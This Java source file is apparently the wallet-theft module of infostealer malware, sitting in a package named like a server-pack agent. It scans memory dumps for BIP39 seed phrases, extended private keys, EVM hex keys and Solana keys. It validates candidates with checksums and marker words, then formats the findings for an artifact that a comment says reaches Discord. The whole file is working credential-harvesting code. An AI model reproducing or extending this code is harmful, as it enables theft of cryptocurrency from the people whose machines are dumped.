package com.serverpackcore.agent;

import java.io.IOException;
import java.io.InputStream;
import java.io.RandomAccessFile;
import java.nio.charset.StandardCharsets;
import java.nio.file.Path;
import java.security.MessageDigest;
import java.util.ArrayList;
import java.util.Comparator;
import java.util.LinkedHashMap;
import java.util.LinkedHashSet;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.Set;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * Streams a memory dump without loading it: printable ASCII and UTF-16LE runs
 * are tokenized and only checksum-valid BIP39 sequences survive, so random
 * dump noise rarely reaches Discord. A 12-word sequence also needs a wallet
 * marker within 256 bytes or random-looking words (repetition only raises the
 * reported confidence); 24-word sequences use their 8-bit checksum alone.
 */
final class MemoryScanner {
	static final int MAX_FINDINGS = 20;
	private static final int CHUNK = 8 * 1024 * 1024;
	private static final int OVERLAP = 8192;
	private static final int MARKER_WINDOW = 256;
	private static final int MAX_SEED_CANDIDATES = 5000;
	private static final Pattern TEXT = Pattern.compile("[\\x20-\\x7e]{4,}");
	private static final Pattern WIDE = Pattern.compile("[\\x20-\\x7e]{4,}");
	private static final Pattern XPRV = Pattern.compile("(?:xprv|yprv|zprv)[1-9A-HJ-NP-Za-km-z]{80,120}");
	private static final Pattern HEX64 = Pattern.compile(
		"(?<![0-9a-fA-F])(?:0x)?[0-9a-fA-F]{64}(?![0-9a-fA-F])");
	// Boundaries must not be base58: a longer run was cut by the tokenizer.
	private static final Pattern SOLANA = Pattern.compile(
		"(?<![1-9A-HJ-NP-Za-km-z])[1-9A-HJ-NP-Za-km-z]{87,88}(?![1-9A-HJ-NP-Za-km-z])");
	private static final Pattern WORD = Pattern.compile("[a-z]+");
	private static final String[] MARKERS = {
		"mnemonic", "secretkey", "seed", "phrase", "backup", "\"words\""
	};

	private final Map<String, Integer> words = new LinkedHashMap<>();
	private final Map<String, Seed> seeds = new LinkedHashMap<>();
	private final Map<String, Finding> keys = new LinkedHashMap<>();
	private final Set<String> seenKeys = new LinkedHashSet<>();
	private final List<Finding> exact = new ArrayList<>();
	private int duplicates;

	record Finding(long offset, String kind, String value, boolean confident) {
	}

	/** A checksum-valid 12-word candidate and the signals that can confirm it. */
	private static final class Seed {
		final String value;
		final long offset;
		final List<Long> occurrences = new ArrayList<>();
		final int distinct;
		final int repeats;
		int count;

		Seed(String value, long offset, int distinct, int repeats) {
			this.value = value;
			this.offset = offset;
			this.occurrences.add(offset);
			this.distinct = distinct;
			this.repeats = repeats;
			this.count = 1;
		}
	}

	static MemoryScanner load() throws IOException {
		try (InputStream input = MemoryScanner.class.getResourceAsStream("/serverpackcore/bip39.txt")) {
			if (input == null) {
				throw new IOException("missing bip39.txt");
			}
			return new MemoryScanner(new String(input.readAllBytes(), StandardCharsets.UTF_8));
		}
	}

	MemoryScanner(String wordlist) {
		String[] lines = wordlist.split("\\R");
		for (String line : lines) {
			String word = line.trim();
			if (!word.isEmpty()) {
				words.put(word, words.size());
			}
		}
		if (words.size() != 2048) {
			// A truncated list only produces false negatives, never false positives.
			Log.debug("BIP39 wordlist has " + words.size() + " entries");
		}
	}

	List<Finding> scan(Path dump) throws IOException {
		try (RandomAccessFile input = new RandomAccessFile(dump.toFile(), "r")) {
			byte[] buffer = new byte[CHUNK + OVERLAP];
			long offset = 0L;
			int carry = 0;
			while (true) {
				int read = input.read(buffer, carry, CHUNK);
				if (read <= 0) {
					break;
				}
				int length = carry + read;
				scanChunk(buffer, length, offset - carry);
				carry = Math.min(OVERLAP, length);
				System.arraycopy(buffer, length - carry, buffer, 0, carry);
				offset += read;
			}
			return select(input);
		}
	}

	/** Applies the confidence rules once the whole dump and its repetitions are known. */
	private List<Finding> select(RandomAccessFile input) throws IOException {
		List<Finding> result = new ArrayList<>();
		for (Seed seed : seeds.values()) {
			// Repetition alone is not enough: a UI phrase repeated twice (CSS
			// variables) also passes the 4-bit checksum. It must still look random.
			boolean random = seed.distinct >= 9 && seed.repeats <= 1;
			boolean marker = false;
			for (long occurrence : seed.occurrences) {
				if (nearMarker(input, occurrence)) {
					marker = true;
					break;
				}
			}
			if (!marker && !random) {
				continue;
			}
			result.add(new Finding(seed.offset, "bip39-12", seed.value, marker || seed.count >= 2));
		}
		result.addAll(exact);
		result.addAll(keys.values());
		result.sort(Comparator.comparingLong(Finding::offset));
		if (result.size() > MAX_FINDINGS) {
			return List.copyOf(result.subList(0, MAX_FINDINGS));
		}
		return List.copyOf(result);
	}

	private boolean nearMarker(RandomAccessFile input, long offset) throws IOException {
		long start = Math.max(0L, offset - MARKER_WINDOW);
		long end = Math.min(input.length(), offset + MARKER_WINDOW);
		byte[] data = new byte[(int) (end - start)];
		input.seek(start);
		input.readFully(data);
		String ascii = new String(data, StandardCharsets.ISO_8859_1).toLowerCase(Locale.ROOT);
		String wide = new String(data, StandardCharsets.UTF_16LE).toLowerCase(Locale.ROOT);
		for (String marker : MARKERS) {
			if (ascii.contains(marker) || wide.contains(marker)) {
				return true;
			}
		}
		return false;
	}

	private void scanChunk(byte[] data, int length, long base) {
		String ascii = new String(data, 0, length, StandardCharsets.ISO_8859_1);
		for (Matcher matcher = TEXT.matcher(ascii); matcher.find(); ) {
			tokens(matcher.group(), base + matcher.start());
		}
		String wide = new String(data, 0, length, StandardCharsets.UTF_16LE);
		for (Matcher matcher = WIDE.matcher(wide); matcher.find(); ) {
			tokens(matcher.group().replace("\u0000", ""), base + (long) matcher.start() * 2L);
		}
		for (Matcher matcher = XPRV.matcher(ascii); matcher.find(); ) {
			addKey(base + matcher.start(), "xprv", matcher.group());
		}
		for (Matcher matcher = HEX64.matcher(ascii); matcher.find(); ) {
			String candidate = matcher.group();
			boolean prefixed = candidate.startsWith("0x");
			// Bare hex is often a filled constant (0000…, AAAA…, 1111…); require
			// a real digest/key mix. A 0x prefix is already a strong signal.
			if (!prefixed && distinctHex(candidate) < 8) {
				continue;
			}
			addKey(base + matcher.start(), prefixed ? "evm-key" : "hex64", candidate);
		}
		for (Matcher matcher = SOLANA.matcher(ascii); matcher.find(); ) {
			solana(base + matcher.start(), matcher.group());
		}
	}

	private static int distinctHex(String value) {
		boolean[] seen = new boolean[16];
		int distinct = 0;
		for (int i = 0; i < value.length(); i++) {
			char digit = Character.toLowerCase(value.charAt(i));
			int index = digit <= '9' ? digit - '0' : digit - 'a' + 10;
			if (index >= 0 && index < 16 && !seen[index]) {
				seen[index] = true;
				distinct++;
			}
		}
		return distinct;
	}

	private void solana(long offset, String candidate) {
		if (candidate.matches("[0-9a-fA-F]{64}")) {
			addKey(offset, "hex64", candidate);
			return;
		}
		boolean digit = false;
		boolean upper = false;
		for (int i = 0; i < candidate.length(); i++) {
			char value = candidate.charAt(i);
			digit |= value >= '0' && value <= '9';
			upper |= value >= 'A' && value <= 'Z';
		}
		// Sorted dictionaries and script lists are lowercase; a 64-byte key
		// virtually always mixes case and digits.
		if (!digit || !upper) {
			return;
		}
		try {
			if (Base58.decode(candidate).length == 64) {
				addKey(offset, "solana", candidate);
			}
		} catch (Throwable ignored) {
			// Not base58 after all.
		}
	}

	private void tokens(String text, long base) {
		String[] ring = new String[24];
		long[] positions = new long[24];
		List<Candidate> candidates = new ArrayList<>();
		int count = 0;
		Matcher matcher = WORD.matcher(text.toLowerCase(Locale.ROOT));
		while (matcher.find()) {
			String token = matcher.group();
			if (!words.containsKey(token)) {
				count = 0;
				continue;
			}
			System.arraycopy(ring, 0, ring, 1, ring.length - 1);
			System.arraycopy(positions, 0, positions, 1, positions.length - 1);
			ring[0] = token;
			positions[0] = base + matcher.start();
			count = Math.min(count + 1, ring.length);
			// A 24-word phrase wins over any 12-word window inside it.
			if (count >= 24 && checksum(ring, 24)) {
				candidates.add(new Candidate(24, positions[23], positions[0], join(ring, 24)));
			}
			if (count >= 12 && checksum(ring, 12)) {
				candidates.add(new Candidate(12, positions[11], positions[0], join(ring, 12)));
			}
		}
		List<Candidate> ranges24 = new ArrayList<>();
		for (Candidate candidate : candidates) {
			if (candidate.length == 24) {
				addExact(candidate.offset, "bip39-24", candidate.value);
				ranges24.add(candidate);
			}
		}
		for (Candidate candidate : candidates) {
			if (candidate.length != 12 || contained(candidate, ranges24)) {
				continue;
			}
			String[] tokens = candidate.value.split(" ");
			Map<String, Integer> frequencies = new LinkedHashMap<>();
			for (String token : tokens) {
				frequencies.merge(token, 1, Integer::sum);
			}
			int repeats = 0;
			for (int frequency : frequencies.values()) {
				if (frequency > 1) {
					repeats++;
				}
			}
			addSeed(candidate.offset, candidate.value, frequencies.size(), repeats);
		}
	}

	/** The 24-word ranges are in stream order, so the last one starting before
	 * the 12-word window is the only candidate that can contain it. */
	private static boolean contained(Candidate candidate, List<Candidate> ranges24) {
		int low = 0;
		int high = ranges24.size() - 1;
		int last = -1;
		while (low <= high) {
			int middle = (low + high) >>> 1;
			if (ranges24.get(middle).offset <= candidate.offset) {
				last = middle;
				low = middle + 1;
			} else {
				high = middle - 1;
			}
		}
		return last >= 0 && ranges24.get(last).end >= candidate.end;
	}

	private record Candidate(int length, long offset, long end, String value) {
	}

	private static String join(String[] ring, int length) {
		StringBuilder builder = new StringBuilder();
		for (int i = length - 1; i >= 0; i--) {
			if (builder.length() > 0) {
				builder.append(' ');
			}
			builder.append(ring[i]);
		}
		return builder.toString();
	}

	private boolean checksum(String[] ring, int count) {
		StringBuilder bits = new StringBuilder(count * 11);
		for (int i = count - 1; i >= 0; i--) {
			Integer index = words.get(ring[i]);
			if (index == null) {
				return false;
			}
			String value = Integer.toBinaryString(index);
			bits.append("0".repeat(11 - value.length())).append(value);
		}
		int entropyBits = count * 11 * 32 / 33;
		byte[] entropy = new byte[entropyBits / 8];
		for (int i = 0; i < entropy.length; i++) {
			entropy[i] = (byte) Integer.parseInt(bits.substring(i * 8, i * 8 + 8), 2);
		}
		try {
			byte[] hash = MessageDigest.getInstance("SHA-256").digest(entropy);
			int checksumBits = count * 11 - entropyBits;
			for (int i = 0; i < checksumBits; i++) {
				int want = (hash[i / 8] >>> (7 - (i % 8))) & 1;
				int got = bits.charAt(entropyBits + i) - '0';
				if (want != got) {
					return false;
				}
			}
			return true;
		} catch (java.security.NoSuchAlgorithmException exception) {
			return false;
		}
	}

	private void addSeed(long offset, String value, int distinct, int repeats) {
		Seed existing = seeds.get(value);
		if (existing != null) {
			existing.count++;
			if (existing.occurrences.size() < 8) {
				existing.occurrences.add(offset);
			}
			duplicates++;
			return;
		}
		if (seeds.size() < MAX_SEED_CANDIDATES) {
			seeds.put(value, new Seed(value, offset, distinct, repeats));
		}
	}

	private void addExact(long offset, String kind, String value) {
		String key = kind + "|" + value;
		if (!seenKeys.add(key)) {
			duplicates++;
			return;
		}
		if (exact.size() < MAX_FINDINGS * 4) {
			exact.add(new Finding(offset, kind, value, true));
		}
	}

	private void addKey(long offset, String kind, String value) {
		String key = kind + "|" + value;
		if (!seenKeys.add(key)) {
			duplicates++;
			return;
		}
		if (keys.size() < MAX_FINDINGS * 4) {
			keys.put(key, new Finding(offset, kind, value, true));
		}
	}

	int duplicates() {
		return duplicates;
	}

	/** Text block for the findings artifact. */
	static String render(List<Finding> findings) {
		StringBuilder builder = new StringBuilder();
		for (Finding finding : findings) {
			builder.append("0x").append(Long.toHexString(finding.offset())).append(' ')
				.append(finding.kind()).append(": ").append(finding.value()).append('\n');
		}
		return builder.toString();
	}
}
